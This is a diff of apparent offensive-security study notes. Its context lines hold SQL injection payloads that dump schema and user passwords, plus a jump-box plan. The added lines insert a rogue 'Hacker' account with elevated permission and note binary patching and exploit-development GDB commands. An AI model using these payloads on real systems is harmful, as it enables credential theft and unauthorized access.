@@ -210,6 +210,8 @@ php?Selection=2 UNION SELECT table_schema,table_name,column_name FROM informatio
 
 php?Selection=2 UNION SELECT id,pass,name from session.user;
 
+INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'Hacker', '2', '2', '2', 3) 
+
 Scheme of Maneuver:
 >Jump Box
 ->T1:10.100.28.48
@@ -270,6 +272,27 @@ Last Known SSH Port: unknown
 PSP: Unknown
 Malware: Unknown
 Action: Extract approved binaries under directory titled "longTermStorage".
+
+##PATCHING
+
+patch selection 
+change JNZ to JZ to swap if statement
+
+##EXPLOIT DEVELOPMENT
+Buffer Defenses:
+Address Space Layout Randomization (ASLR)
+Stack Canaries
+
+Tools: IDA,Ghidra
+
+GDB Commands: 
+
+disass <FUNCTION>   #   Disassemble portion of the program
+info <...>  #   Supply info for specific stack areas
+x/256c $<REGISTER>  #   Read characters from specific register
+break <address>  #   Establish a break point
+
+
 
 
 
